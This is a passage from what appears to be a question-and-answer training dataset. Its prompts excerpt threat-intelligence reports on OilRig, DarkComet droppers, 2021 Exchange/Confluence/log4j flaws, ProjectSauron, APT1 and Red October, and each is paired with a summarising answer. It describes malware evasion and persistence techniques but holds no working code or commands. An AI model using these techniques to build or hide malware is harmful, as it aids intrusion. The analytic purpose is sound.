the cloud service providers misused for the C&C communication, and other specifics.\nOilRig has only used these downloaders against a limited number of targets, all located in Israel and, according to ESET telemetry, all of them were persistently targeted months earlier by other OilRig tools. As it is common for organizations to access Office 365 resources, OilRig's cloud service-powered downloaders can thus blend more easily into the regular stream of network traffic \u2013 apparently also the reason why the attackers chose to deploy these downloaders to a small group of especially interesting, repeatedly victimized targets.\nAs of this writing, the following (exclusively Israeli, as noted above) organizations were affected:\na manufacturing company (SC5k v1, ODAgent, and OilCheck),\na local governmental organization (SC5k v1, OilBooster, and SC5k v2),\na healthcare organization (SC5k v3), and\nother unidentified organizations in Israel (SC5k v1).\nUnfortunately, we don't have information about the initial attack vector used to compromise the targets discussed in this blogpost \u2013 we can't confirm whether the attackers have been able to successfully compromise the same organizations repeatedly, or if they somehow managed to keep their foothold in the network in between deploying various tools.\nQ: How does the OilRig APT group leverage cloud services for command and control (C&C) communications in their downloaders, and what are the advantages of this approach?",
    "output": "The OilRig APT group leverages cloud services such as the Microsoft OneDrive API and cloud-based email services for C&C communications in their downloaders. This approach allows the malware to blend more easily into the regular stream of network traffic, making it harder for security analysts to detect. For instance, ODAgent uses the Microsoft OneDrive API, while SC5k and OilCheck use cloud-based email services. By utilizing commonly accessed services like Office 365, the downloaders can operate more stealthily within the network, reducing the likelihood of detection.",

    "instruction": "Context: Small Headline: SPECIAL ASSIGNMENT\nIn this redacted, translated, and excerpted conversation the leader of an opposition fighting group is offered a fighting job: launch an attack on a particular airport. The emphasis on communications discipline, and the need for documentation are both notable.  The need for photographic proof suggests a need for verification by a distant party, perhaps the \"funder\" who is said to be in Saudi Arabia. Perhaps photographic proof is also important for a group (or funder's) reputation and being able to claim credit for a particular attack.\nPERSON 2\nIn full form, this conversation reveals several pieces of sensitive military information regarding the opposition's approach to launching, funding, and operationalizing an attack plan. The potential real-time surveillance of opposition wartime discussions could provide the Assad regime with valuable intelligence about ongoing or planned military campaigns, identification of who funds the opposition, and how the operational financial infrastructure works.\nVery Small Headline: BLACKSTAR, A CUSTOM DROPPER FOR THE DARKCOMET RAT\nDarkComet is a widely available, stable, and easy to use remote administration tool (RAT) that allows a threat actor to control a compromised system. In addition to standard backdoor functions such as manipulating processes, services, the registry, and uploading and downloading files, DarkComet can also activate the webcam and microphone. Since DarkComet is so well known, security products such as antivirus software can often detect it.\nThis threat group uses a custom dropper which we call BLACKSTAR. BLACKSTAR contains an embedded, obfuscated binary which is a second dropper and launcher that we call REDDWARF. REDDWARF contains the actual DarkComet payload. BLACKSTAR writes REDDWARF to disk for persistence, but DarkComet itself is only ever extracted to memory by REDDWARF. Many antivirus vendors fail to detect this DarkComet backdoor because it is obfuscated inside the BLACKSTAR binary or because it is loaded into memory using process replacement.\nBLACKSTAR malware performs the following actions:\n1. The BLACKSTAR binary (in this case, adobereadersetup-86x.exe, 39632325327bf21f7d9cf02caf065646) is first extracted from two nested SFXRAR archives, as described above.\n2. BLACKSTAR contains two resources:15\n\u2022 QUYFKY\\DIOKAK contains a decoder key for the configuration data and the embedded PE (REDDWARF).\n\u2022 QUYFKY\\UXLNYL contains the encoded configuration data which consists of function names that the malware resolves dynamically, as well as offsets used to extract the embedded PE.\n3. REDDWARF is actually contained within a Word document embedded within the BLACKSTAR binary. BLACKSTAR first finds the offset of the embedded Word file, then decodes the configuration data that includes the offset of the REDDWARF binary within the Word file.16 The embedded key is used to decode the embedded REDDWARF binary (8af83d74033aded17af538e4ccf12092). REDDWARF is loaded in to memory and executed, replacing the BLACKSTAR process in memory through a technique known as process replacement.17\n15 The resource names vary across samples, and appear to consist of six random upper-case letters.\n16 The Word document is never written to disk, and may simply be intended to further mask the REDDWARF binary.\n17 Process replacement replaces a legitimate binary in memory with a malicious one. First, a legitimate binary is launched in a suspended state. The content of the legitimate binary is then unmapped from memory, memory is allocated at the original binary's location, and the content of the malicious file is written to that memory space. The main suspended thread is pointed to the memory location of the malicious code, and the thread is resumed, executing the malware. By using process replacement the malicious code will appear to be the legitimate process to many analysis tools.\n4. REDDWARF contains two resources:\n\u2022 RT_RCDATA\\1 which contains the DarkComet binary (24f1658f3f38245dc15b9619bc97979b);\n\u2022 RT_RCDATA\\2 which contains plaintext configuration data. Similar to BLACKSTAR, the REDDWARF configuration data consists of function names that the malware resolves dynamically; the registry location that the malware should use for persistence; and (optionally) a file name that contains a script.\n5. REDDWARF extracts the DarkComet backdoor and spawns a copy of itself. It uses process replacement on that copy to launch the DarkComet backdoor in memory. Finally REDDWARF copies itself to disk, maintaining persistence via the registry entry specified in its configuration file (e.g., HKCU\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\1).\nWe suspect that the malware authors used an automated tool to embed the DarkComet payload within the second binary and\nwithin the BLACKSTAR dropper. Interestingly, we observed at least one case where the payload may have been run through the packaging tool twice; that is, the BLACKSTAR dropper contained an embedded REDDWARF binary, which contained another BLACKSTAR dropper, which contained another REDDWARF binary, which contained the final DarkComet payload:\n\u2022 BLACKSTAR binary(itselfcontained within multipleSFXRAR files): GoogleUpdate.exe,7247d42b3b4632dc7ed9d8559596fff8.\n\u2022 Embedded REDDWARF binary: 1b20ea5887775f8eddf5aecd5d220154\n\u2022 Embedded BLACKSTAR binary: 97a35a7471e0951ee4ed8581d2941601\n\u2022 Embedded REDDWARF binary: dd08f85686bd48e4bab310d8fbff81a4\n\u2022 Embedded DarkComet payload:\nae1ea30e6fb834599a8fed11a9b00314\nThat particular BLACKSTAR dropper (7247d42b3b4632dc7ed9d8559596fff8) was dropped by at least four different original \"lure\" files.\nAnswer this question: Describe the role of REDDWARF in the BLACKSTAR malware delivery chain and how it contributes to the overall effectiveness of the attack.",
    "output": "REDDWARF plays a crucial role in the BLACKSTAR malware delivery chain. It is embedded within the BLACKSTAR binary and is responsible for extracting and launching the DarkComet backdoor. REDDWARF is loaded into memory and executed using process replacement, ensuring that it appears as a legitimate process. It then extracts the DarkComet binary, spawns a copy of itself, and uses process replacement again to launch DarkComet in memory. Finally, REDDWARF copies itself to disk for persistence via a registry entry. This multi-stage process increases the complexity of the attack, making it more difficult for security solutions to detect and mitigate the threat.",

    "instruction": "Big Headline: 2 The Major Vulnerabilities in 2021\nAs in every year, many vulnerabilities were discovered in 2021, for which vendors released hotfixes, administrators hopefully applied them, and security personnel reviewed infrastructure for successful remediation. Meanwhile, hackers developed exploits and used them to compromise the remaining vulnerable systems and gain an advantage. Business as usual?\nHowever, one thing has changed in the last year: The quality of some discovered vulnerabilities was outstanding in terms of the software affected, the ease of exploitation and impact, and the frequency of occurrence was higher than ever before. However, things have also changed on the attackers' side: Some of these vulnerabilities were discovered not with good intentions by security researchers. They were searched for in order to use them for attack campaigns. This resulted in exploits being available early and widespread exploitation by various actors, sometimes even before the affected organizations could react.\nLooking back at 2021, the following vulnerabilities, among others, immediately come to mind:\n\u25a1 Microsoft Exchange was affected by several security vulnerabilities in 2021, which became very critical mainly due to chaining them in attacks.\n\u25a1 In March 2021, ProxyLogon2(<>), often publicly referred to as Hafnium, was finally made public, while rumors of targeted exploitation had already existed since November 2020. Immediately following the disclosure, a previously unseen wave of widespread exploitation followed before most organizations could respond and some were not even aware of the vulnerability. During this time, we analyzed 84 Microsoft Exchange instances from various customers with our preferred APT scanner THOR3 (<>)and found that 96% of them were scanned for ProxyLogon and in 44% of the cases the vulnerability was also exploited.\n\u25a1 ProxyLogon was just one vulnerability in a whole series of vulnerabilities that put Exchange environments at risk. There were also ProxyOracle, ProxyShell, ProxyToken, and other Remote Code Execution (RCE) vulnerabilities4 (<>)with publicly available exploits, as this collection shows: . We received some customer requests to analyze compromised Exchange servers, claiming to have fixed the ProxyLogon vulnerability and not being able to explain how this could happen.\n\u25a1 Remarkably, the attention of administrators, security experts and the trade press decreased from vulnerability to vulnerability - despite vendor advisories, available exploits, and warnings about active abuse. The Exchange issue became annoying, we heard more than once \"I just can't patch Exchange anymore\" and reports about it were no longer clickbait.\n\u25a1 In August 2021, Atlassian's Confluence was affected by an easy-to-exploit RCE vulnerability5 (<>)due to a OGNL injection. Shortly after the disclosure, ready-to-use exploits were available, and widespread exploitation attempts were observed on the Internet. In this case, many publicly accessible environments were also compromised. In contrast to ProxyLogon, we received comparatively few requests for proactive analysis, but more requests for post-breach analysis.\n\u25a1 The RCE vulnerability in the widely used Java library log4j6 (<>), also known as log4shell, once again generated a lot of attention on the part of defenders and attackers in December 2021. Again, it took only a few hours before the first widespread scans for affected systems and exploitation attempts began. With the previously mentioned vulnerabilities, it was easy to assess whether an organization was affected, and the scope of analysis was limited to individual systems. In the case of log4shell, on the other hand, the effort was higher, and especially the proof of successful exploitation was laborious, as it had to be provided for each system individually7(<>). Since it was close to Christmas and many employees were already on vacation, some organizations decided to fix the vulnerability as part of their regular patch cycle and hope that they would not fall victim to an attack. Even though the number of attacks has decreased in early 2022, we and many other security experts8 (<>)believe that there are still many undiscovered vulnerabilities whose impact will only become apparent in the coming months, and that many applications will remain vulnerable for a long time.\n2 , , , and\n3\n4 ProxyOracle: and ProxyShell: , and ; ProxyToken: ; another RCE\n5\n6 and\n7\n8\nLooking at the various players who were looking for, and in some cases abusing vulnerable systems, four categories can be distinguished based on their motivation and impact:\n\u25a1 As usual, many security researchers have tried to map the attack surface and/or to warn the affected organizations. Even if they do not compromise systems during scanning, they leave traces. Operators must spend time to figure out the intent of the attack attempt.\n\u25a1 The largest group were script kiddies and hobbyists who tried to exploit these vulnerabilities for fun or to achieve certain smaller goals like deploying crypto miners or web shells9 (<>). Since they usually do not try to move laterally, the impact was limited to the compromised system.\n\u25a1 The group with the most attention were opportunistic cybercrime gangs, especially ransomware groups, or professional hackers with the goal of sabotaging and extorting organizations or placing backdoors and selling access to companies on the black market. In case of successful ransomware attacks, high financial and business impact was caused.\n\u25a1 But there is a fourth group, often overlooked, that has benefited from the scatter fire of the previously mentioned attackers: APT groups and advanced hackers. Because their attacks are more targeted, the total number of attacks is lower. The number of unreported cases is also much higher, as the impact is not as obvious to the public as in the case of ransomware. The actual impact through stolen information and intellectual property is also difficult to assess. Since many victims are not aware of the risk of becoming victims of espionage, APT groups are often underestimated as actors.\n9 IOCs from a ProxyShell exploitation:\n\nWhat were the key vulnerabilities in 2021 that significantly impacted various software environments, and how did organizations respond to these threats?",
    "output": "Key vulnerabilities in 2021 included ProxyLogon affecting Microsoft Exchange, an RCE vulnerability in Atlassian's Confluence due to OGNL injection, and the log4shell vulnerability in the Java library log4j. Organizations responded differently to these threats. For ProxyLogon, many organizations struggled to patch quickly, leading to widespread exploitation. For the Confluence vulnerability, there were fewer proactive analyses but more post-breach analyses requested. The log4shell vulnerability required extensive efforts to assess and mitigate, with some organizations delaying patches until their regular patch cycles due to holiday seasons.",

    "instruction": "Big Headline: VFS Structure\nThe VFS can have both a linear and a two-level hierarchical view. In the case of a two-level hierarchical view, one of the levels contains the data responsible for process injection, data stealing and storing it into the local ProjectSauron cache, and the second structure contains the data for exfiltration and external network communications. In the case of a linear view, all types of modules are located on a single level.\nCuriously, in many cases the same plugins are found in both the VFS upper and lower levels.\nTypically, a local cache of stolen files is located within the C:\\System Volume Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A} folder, and keylogging results are stored in %WINDIR%\\Temp\\ folder under the names 'bka*.da' or '~*.tmp'.\nThe VFS has some pre-defined packages of plugins called 'blobs'.\nThe minimal set of plugins for process injection and stored data exfiltration is called kblog.blob and consists of the following modules:\n\u2022 detach\n\u2022 ilpsend\n\u2022 dir\n\u2022 skip\nIn some cases, there exists an 'extended' package variant used that redirects the exfiltration data stream through its own local proxy-server and wipes sent documents upon completion. The extended variant contains the following modules:\n\u2022 kgate\n\u2022 knatt\n\u2022 wipe\nInterestingly, there is no automatic wiping of the documents sent to the server in the 'minimal' package. It's assumed that this task should be carried out by second Lua-script (in the case of a hierarchical VFS \u2013 the parent or child). However, this assumption is not met in all cases. This means that in such cases the stolen documents are not removed and remain stored in the ProjectSauron cache forever, which suggests a design flaw.\nBig Headline: C2 Infrastructure\nThe ProjectSauron actor is extremely well prepared when it comes to operational security. Running an expensive cyberespionage campaign like ProjectSauron requires vast domain and server infrastructure uniquely assigned to each victim organization and never again reused. This makes traditional network-based indicators of compromise useless because they are never reused in any other organization.\nWe collected 28 domains linked to 11 IPs located in the United States and several European countries that might be connected to ProjectSauron campaigns.\nEven the diversity of ISPs selected for ProjectSauron operations makes it clear that the actor did everything possible to avoid creating patterns. Unfortunately, little is known about these servers.\nThe list of ProjectSauron domains follows (domains in bold were extracted from malware, the rest were found via Passive DNS and are not validated):\nBig Headline: Attribution\nAttribution is hard and reliable attribution is rarely possible in cyberspace. Even with confidence in various indicators and apparent attacker mistakes, there is a greater likelihood that these can all be smoke and mirrors created by an attacker with a greater vantage point and vast resources. When dealing with the most advanced threat actors, as is the case with ProjectSauron, attribution becomes an unsolvable problem.\nRather than speculate on the perpetrators behind such a sophisticated attack, we instead highlight a few relevant observations made during analysis.\nMedium Headline: Language Use\nAll human-written text is in English.\nCore scenarios that orchestrated ProjectSauron modules were written in Lua, a computer language that traditionally doesn't support the UTF-16 character set for string operations. However, the target systems had some local paths in a non-Latin character set thus creating the requirement to extend Lua to support UTF-16, which the developers of ProjectSauron did. This suggests that originally the ProjectSauron developers worked and tested their code on systems with a Latin character set and only after deploying it in a real-world scenario found Lua's features deficient. Instead of scraping their interpreter of choice, they decided to modify it to implement the missing features.\nOne of the configuration files we extracted contained a list of file extensions and keywords that contain Italian words:\nThe italian keywords and filenames targeted by ProjectSauron data theft modules can be translated as following:\nMost ProjectSauron modules contain standard embedded usage output in proficient English, i.e.\nSmall Headline: arping module\n-r Resolve hosts that answer.\n-l Print only replying Ips.\n-m Do not display MAC addresses.\nThis looks like a very traditional Unix-way of outputting simple command help/usage.\nHowever, there is no common style of outputting module usage and it varies from module to module. Here is an example of a different usage output:\nWhile it may look similar to the previous usage output an experienced user would recognize the difference: it looks more like a usage of command from Windows. The option '-?' is rarely seen in the Unix world, optional parameters are enclosed with '[' and ']' characters, mandatory parameters are enclosed with '<' and '>', etc.\nThe following example of usage output is indicative of an experienced Unix user with proper formatting:\nSmall Headline: basex module\nbasex [-b <base>] [-d [-f]] [-h]\nOptions:\n-b base  64, 64url, 32, 32url or 16. Default is 64\n-d Decode data. Default is to encode\n-f Force decoding when input is invalid/corrupt\n-h This cruft\nUses standard in/out. See man page for examples.\nIt seems that the same developer created several tools, as indicated by further identical-style usage formatting.\nThere is a noteworthy reference to a 'man page', a term for standard Unix manuals. Another unique language feature is usage of \"This cruft\" for the -h option. The term cruft is rarely used by non-native speakers and actually has a article to explain its use:\n\"Cruft is jargon for anything that is left over, redundant and getting in the way. It is used particularly for superseded and unused technical and electronic hardware and useless, superfluous or dysfunctional elements in computer software.\"\n...\n\"Around 1958, the term was used in the sense of \"garbage\" by students frequenting the MIT Tech Model Railroad Club.\"\n...\n\"The FreeBSD handbook uses the term to refer to leftover or superseded object code that accumulates in a folder or directory when software is recompiled and new executables and data files produced.\"\nOlder versions of software in the *BSD world, such as cryptcat or netcat (a very common universal network client/server tool for network testing) used identical option descriptions:\nIn fact, this unique way to comment the '-h' option is mostly found in netcat-derivative projects based on the original netcat developed by an old-school hacker known as 'hobbit' (hobbit@avian.org)1 , who first released the netcat source code back in 1995. Hobbit used the word \"cruft\" four times in the netcat110 source code from 1996:\nHowever, we do not believe that hobbit can be in any way related to the development of ProjectSauron modules. The more likely explanation is that the developers of the ProjectSauron modules are also old school hackers that develop advanced tools and use \"this cruft\" as a tribute to old and stable tools.\n1 Hobbit's personal page is at http://techno-fandom.org/~hobbit/\nBig Headline: Conclusions\nEvery APT attack we analyze brings with it some new knowledge about the nature of cyberespionage. The attackers are hackers first and foremost and, as proficient hackers, they invent novel ways to get into a network, do lateral movement, leave nearly no traces, all while exfiltrating valuable data.\nProjectSauron is a very advanced actor, comparable only to the top-of-the-top in terms of sophistication: alongside Duqu, Flame, Equation, and Regin. Whether related or unrelated to these advanced actors, the ProjectSauron attackers have definitely learned from these others.\nAs a reminder, here are some features of other APT attackers that ProjectSauron attackers had carefully learned from or emulated:\nDuqu:\n\u2022 Use of intranet C2s (that compromised target servers may act as independent C2s)\n\u2022 Running only in memory (persistence on a few gateway hosts only)\n\u2022 Use of different encryption methods per victim\n\u2022 Use of named pipes for LAN communication\n\u2022 Malware distribution through legitimate software deployment channels\nFlame:\n\u2022 Lua-embedded code\n\u2022 Secure file deletion (through data wiping)\n\u2022 Attacking air-gapped systems via removable devices\nEquation and Regin:\n\u2022 Usage of RC5/RC6 encryption\n\u2022 Virtual Filesystems (VFS)\n\u2022 Attacking air-gapped systems via removable devices\n\u2022 Hidden data storage on removable devices\nThese other actors also showed what makes them vulnerable to potential exposure and ProjectSauron did its best to address these issues:\n\u2022 Vulnerable or persistent C2 locations\n\u2022 ISP, IP, domains, and tool reuse across different campaigns\n\u2022 Crypto-algorithms reuse (as well as encryption keys)\n\u2022 Forensic evidence on disk\n\u2022 Timestamps in various components\n\u2022 Large volumes of network data or unusual protocols or message formats\nIn addition, it appears that the attackers took special care with what we consider as indicators of compromise and implemented a unique pattern for each and every target they attacked, so that the same indicators\nwould have little value for anyone else. This is a summary of the ProjectSauron strategy as we see it. The attackers clearly understand that we as researchers are always looking for patterns. Remove the patterns and the operation will be harder to discover. We are aware of more than 30 organisations attacked but we are sure that this is just a tiny tip of the iceberg.\nA common organisation hit by a serious actor such as ProjectSauron can hardly cope with proper detection and mitigation of such a threat on its own. As attackers become seasoned and more mature, the defending side will have to build an identical mindset: developing the highest technical skills comparable to those of the attackers in order to resist their onslaught.\nContact us at:\n\nWhat are the key differences between the 'minimal' and 'extended' plugin packages in ProjectSauron's VFS, and how do these differences impact the attack strategy?",
    "output": "The 'minimal' plugin package, called kblog.blob, includes modules for process injection and data exfiltration: detach, ilpsend, dir, and skip. The 'extended' package adds modules for redirecting exfiltration data through a local proxy-server and wiping sent documents: kgate, knatt, and wipe. The key difference is that the 'extended' package includes additional security measures to cover tracks by wiping documents, while the 'minimal' package does not automatically wipe sent documents. This impacts the attack strategy by providing a more secure and less traceable exfiltration process in the 'extended' package, making it harder for defenders to detect and analyze the attack.",

    "instruction": "Small Headline: Beachhead Backdoors\nBeachhead backdoors are typically minimally featured. They offer the attacker a toe-hold to perform simple tasks like retrieve files, gather basic system information and trigger the execution of other more significant capabilities such as a standard backdoor.\nwhat is a malware family?\nA malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. To help illustrate this, consider the following example from the physical world. There is now a vast array of computing tablets for sale. These include Apple's iPad, Samsung's Galaxy Tab, and Microsoft's Surface. Although these are all tablet computers, \"under the hood\" they are probably quite different. However, one can expect that an iPad 1 and an iPad 2 share a significant number of components \u2014 much more than, say, an iPad 1 and a Microsoft Surface. Thus it makes sense to refer to the iPad \"family\" and the Surface \"family\".\nWhen it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.\nAPT1's beachhead backdoors are usually what we call WEBC2 backdoors. WEBC2 backdoors are probably the most well-known kind of APT1 backdoor, and are the reason why some security companies refer to APT1 as the \"Comment Crew.\" A WEBC2 backdoor is designed to retrieve a webpage from a C2 server. It expects the webpage to contain special HTML tags; the backdoor will attempt to interpret the data between the tags as commands. Older versions of WEBC2 read data between HTML comments, though over time WEBC2 variants have evolved to read data contained within other types of tags. From direct observation, we can confirm that APT1 was using WEBC2 backdoors as early as July 2006. However, the first compile time35 we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years.\nFor example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process:\nVery Small Headline: sample B\nMD5: c1393e77773a48b1eea117a302138554\nCompile date: 2009-08-07\nD:\\work\\code\\2008-7-8muma\\mywork\\winInet_ winApplication2009-8-7\\mywork\\aaaaaaa\\Release\\ aaaaaaa.pdb\nweBC2 families\nWEBC2-AUSOV\nWEBC2-ADSPACE\nWEBC2-BOLID\nWEBC2-CLOVER\nWEBC2-CSON\nWEBC2-DIV\nWEBC2-GREENCAT\nWEBC2-HEAD\nWEBC2-KT3\nWEBC2-QBP\nWEBC2-RAVE\nWEBC2-TABLE\nWEBC2-TOCK\nWEBC2-UGX\nWEBC2-YAHOO\nWEBC2-Y21K\n\u2026 and many still uncategorized\n35 \"Compile\" refers to the process of transforming a programmer's source code into a file that a computer can understand and execute. The compile date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.\nThe BISCUIT backdoor (so named for the command \"bdkzt\") is an illustrative example of the range of commands that APT1 has built into its \"standard\" backdoors. APT1 has used and steadily modified BISCUIT since as early as 2007 and continues to use it presently.\ntaBLe 4: a subset of BIsCuIt commands\nThese functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone who wants to control a system remotely will likely put functions like \"Upload/download files\" into a backdoor.\nSmall Headline: Covert Communications\nSome APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. APT1 has created a handful of these, including:\ntaBLe 5: Backdoors that mimic legitimate communication protocols\nWhen network defenders see the communications between these backdoors and their C2 servers, they might easily dismiss them as legitimate network traffic. Additionally, many of APT1's backdoors use SSL encryption so that communications are hidden in an encrypted SSL tunnel. We have provided APT1's public SSL certificates in Appendix F so people can incorporate them into their network signatures.\nMedium Headline: Privilege Escalation\nEscalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more resources within the network. In this and the next two stages, APT1 does not differ significantly from other APT intruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from victim systems in order to obtain legitimate user credentials.\nAPT1 has used these privilege escalation tools:\ntaBLe 6: Publicly available privilege escalation tools that aPt1 has used\nwhat is a password hash?\nWhen a person logs in to a computer, website, email server, or any networked resource requiring a password, the supplied password needs to be verified. One way to do this would be to store the person's actual password on the system that the person is trying to access, and to compare the typed password to the stored password. Although simple, this method is also very insecure: anyone who can access that same system will be able to see the person's password. Instead, systems that verify passwords usually store password hashes. In simple terms, a password hash is a number that is mathematically generated from the person's password. The mathematical methods (algorithms) used to generate password hashes will create values that are unique for all practical purposes. When a person supplies their password, the computer generates a hash of the typed password and compares it to the stored hash. If they match, the passwords are presumed to be the same and the person is allowed to log in.\nIt is supposed to be impossible to \"reverse\" a hash to obtain the original password. However, it is possible with enough computational resources to \"crack\" password hashes to discover the original password. (\"Cracking\" generally consists of guessing a large number of passwords, hashing them, and comparing the generated hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems in hopes that they can either use the hashes as-is (by \"passing-the-hash\") or crack them to discover users' passwords.\nMedium Headline: Internal Reconnaissance\nIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT (and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system and its networked environment. Although they usually simply type these commands into a command shell, sometimes intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that APT1 used on at least four victim networks.\nFIGure 18: an aPt1 batch script that automates reconnaissance\nThis script performs the following functions and saves the results to a text file:\n\u00bb\u00bb Display the victim's network configuration information\n\u00bb\u00bb List the services that have started on the victim system\n\u00bb\u00bb List currently running processes\n\u00bb\u00bb List accounts on the system\n\u00bb\u00bb List accounts with administrator privileges\n\u00bb\u00bb List current network connections\n\u00bb\u00bb List currently connected network shares\n\u00bb\u00bb List other systems on the network\n\u00bb\u00bb List network computers and accounts according to group (\"domain controllers,\" \"domain users,\" \"domain admins,\" etc.)\nMedium Headline: Lateral Movement\nOnce an APT intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder to move around the network undetected:\n\u00bb\u00bb They can connect to shared resources on other systems\n\u00bb\u00bb They can execute commands on other systems using the publicly available \"psexec\" tool from Microsoft Sysinternals or the built-in Windows Task Scheduler (\"at.exe\")\nThese actions are hard to detect because legitimate system administrators also use these techniques to perform actions around the network.\nSmall Headline: 1. Install new backdoors on multiple systems\nThroughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks.\nSmall Headline: 2. use legitimate vPn credentials\nAPT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. We have observed APT1 using stolen usernames and passwords to log into victim networks' VPNs when the VPNs are only protected by single-factor authentication. From there they are able to access whatever the impersonated users are allowed to access within the network.\n36 Mandiant uses the term \"credentials\" to refer to a userid and its corresponding, working password.\n\nHow does APT1's BISCUIT backdoor exemplify the range of commands used in standard backdoors, and why is this important for cybersecurity professionals to understand?",
    "output": "A: APT1's BISCUIT backdoor includes a wide range of commands such as uploading/downloading files, executing commands, and gathering system information. These functions are typical of most backdoors and are not unique to APT1. Understanding the capabilities of backdoors like BISCUIT is important for cybersecurity professionals because it highlights the common tactics, techniques, and procedures (TTPs) used by advanced threat actors. By recognizing these standard features, defenders can better prepare and respond to potential intrusions, regardless of the specific backdoor variant being used.",

    "instruction": "Medium Headline: What is Rocra? Where does the name come from? Was Operation Rocra targeting any specific industries, organizations or geographical regions?\nRocra (short for \"Red October\") is a targeted attack campaign that has been going on for at least five years. It has infected hundreds of victims around the world in eight main categories:\n1. Government\n2. Diplomatic / embassies\n3. Research institutions\n4. Trade and commerce\n5. Nuclear / energy research\n6. Oil and gas companies\n7. Aerospace\n8. Military\nIt is quite possible there are other targeted sectors which haven't been discovered yet or have been attacked in the past.\nMedium Headline: How many infected computers have been identified by Kaspersky Lab? How many victims are there? What is the estimated size of Operation Red October on a global scale?\nDuring the past months, we've counted several hundreds of infections worldwide - all of them in top locations such as government networks and diplomatic institutions. The infections we've identified are distributed mostly in Eastern Europe, but there are also reports coming from North America and Western European countries such as Switzerland or Luxembourg.\nBased on our Kaspersky Security Network (KSN) here's a list of countries with most infections (only for those with more than 5 victims):\nFor the sinkhole statistics see below.\nMedium Headline: Who is behind/responsible for this operation? Is this a nation-state sponsored attack?\nThe information we have collected so far does not appear to point towards any specific location, however, two important factors stand out:\nThe exploits appear to have been created by Chinese hackers.\nThe Rocra malware modules have been created by Russian-speaking operatives.\nCurrently, there is no evidence linking this with a nation-state sponsored attack. The information stolen by the attackers is obviously of the highest level and includes geopolitical data which can be used by nation states. Such information could be traded in the underground and sold to the highest bidder, which can be of course, anywhere.\nMedium Headline: Are there any interesting texts in the malware that can suggest who the attackers are?\nSeveral Rocra modules contain interesting typos and mis-spellings:\nnetwork_scanner: \"SUCCESSED\", \"Error_massage\", \"natrive_os\", \"natrive_lan\"\nimapispool: \"UNLNOWN_PC_NAME\", \"WinMain: error CreateThred stop\"\nmapi_client: \"Default Messanger\", \"BUFEER IS FULL\"\nmsoffice_plugin: \"my_encode my_dencode\"\nwinmobile: \"Zakladka injected\", \"Cannot inject zakladka, Error: %u\"\nPswSuperMailRu: \"-------PROGA START-----\", \"-------PROGA END-----\"\nThe word \"PROGA\" used in here might refer to transliteration of Russian slang \"\u041f\u0420\u041e\u0413\u0410\", which literally means an application or a program among Russian-speaking software engineers.\nIn particular, the word \"Zakladka\" in Russian can mean:\n\"bookmark\"\n(more likely) a slang term meaning \"undeclared functionality\", i.e. in software or hardware.\nHowever, it may also mean a microphone embedded in a brick of the embassy building.\nThe C++ class that holds the C&C configuration parameters is called \"MPTraitor\" and the corresponding configuration section in the resources is called \"conn_a\". Some examples include:\nMedium Headline: What kind of information is being hijacked from infected machines?\nInformation stolen from infected systems includes documents with extensions: txt, csv, eml, doc, vsd, sxw, odt, docx, rtf, pdf, mdb, xls, wab, rst, xps, iau, cif, key, crt, cer, hse, pgp, gpg, xia, xiu, xis, xio, xig, acidcsa, acidsca, aciddsk, acidpvr, acidppr, acidssa.\nIn particular, the \"acid*\" extensions appear to refer to the classified software \"Acid Cryptofiler\", which is used by several entities such as the European Union and/or NATO.\nMedium Headline: What is the purpose/objective of this operation? What were the attackers looking for by conducting this sustained cyber-espionage campaign for so many years?\nThe main purpose of the operation appears to be the gathering of classified information and geopolitical intelligence, although it seems that the information gathering scope is quite wide. During the past five years, the attackers collected information from hundreds of high profile victims although it's unknown how the information was used.\nIt is possible that the information was sold on the black market, or used directly.\nMedium Headline: What are the infection mechanisms for the malware? Does it have self-propagating (worm) capabilities? How does it work? Do the attackers have a customized attack platform?\nThe main malware body acts as a point of entry into the system which can later download modules used for lateral movement. After initial infection, the malware won't propagate by itself - typically, the attackers would gather information about the network for a few days, identify key systems and then deploy modules which can compromise other computers in the network, for instance by using the MS08-067 exploit.\nIn general, the Rocra framework is designed for executing \"tasks\" that are provided by its C&C servers. Most of the tasks are provided as one-time PE DLL libraries that are received from the server, executed in memory and then immediately discarded.\nSeveral tasks however need to be constantly present in the system, i.e. waiting for the iPhone or Nokia mobile to connect. These tasks are provided as PE EXE files and are installed in the infected machine.\nMedium Headline: Examples of \"persistent\" tasks\nOnce a USB drive is connected, search and extract files by mask/format, including deleted files. Deleted files are restored using a built in file system parser\nWait for an iPhone or a Nokia phone to be connected. Once connected, retrieve information about the phone, its phone book, contact list, call history, calendar, SMS messages, browsing history\nWait for a Windows Mobile phone to be connected. Once connected, infect the phone with a mobile version of the Rocra main component\nWait for a specially crafted Microsoft Office or PDF document and execute a malicious payload embedded in that document, implementing a one-way covert channel of communication that can be used to restore control of the infected machine\nRecord all the keystrokes, make screenshots\nExecute additional encrypted modules according to a pre-defined schedule\nRetrieve e-mail messages and attachments from Microsoft Outlook and from reachable mail servers using previously obtained credentials\nMedium Headline: Examples of \"one-time\" tasks\nCollect general software and hardware environment information\nCollect filesystem and network share information, build directory listings, search and retrieve files by mask provided by the C&C 